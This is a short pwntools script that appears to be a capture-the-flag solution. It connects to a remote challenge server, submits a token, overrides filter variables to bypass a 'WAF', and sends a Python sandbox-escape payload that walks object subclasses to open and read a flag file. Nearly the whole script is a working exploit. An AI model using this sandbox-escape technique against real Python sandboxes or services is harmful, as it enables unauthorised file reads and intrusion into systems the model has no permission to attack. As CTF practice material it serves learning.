from pwn import *

p = remote('ctfgame.acdxvfsvd.net', 30005)

p.recvuntil('Your Token:')
p.sendline('50llRDHlw2UkO1aAZTemJAae6dBGdTgD')

p.recvuntil('Could you bypass it?')

p.sendline("Th1s_1S_WAF=('aaaaaaaaa','aaaaaaaac')")
p.sendline("targets=('baaaaaaaa','6666666')")
p.sendline(
    'print(().__class__.__bases__[0].__subclasses__()[40]("flag").read())')

print(p.recvuntil('}'))
